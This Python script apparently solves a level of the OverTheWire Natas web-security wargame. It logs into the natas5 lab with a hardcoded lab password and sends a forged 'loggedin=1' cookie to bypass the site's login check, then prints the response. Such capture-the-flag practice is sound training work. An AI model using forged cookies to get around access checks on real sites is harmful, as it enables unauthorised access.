#!/usr/bin/env python

import requests
NATAS="natas5"
PASS='iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'

#headers = { 'referer': 'http://natas5.natas.labs.overthewire.org/'}

r = requests.get("http://" + NATAS + ".natas.labs.overthewire.org/index.php" , auth=(NATAS, PASS) , cookies={'loggedin': '1'})

print(r.history)
print(r.status_code)
print(r.text)
#print("Encording: " + r.encoding + "HTTP Code: " + "Headers: " + r.headers)
print(r.headers)

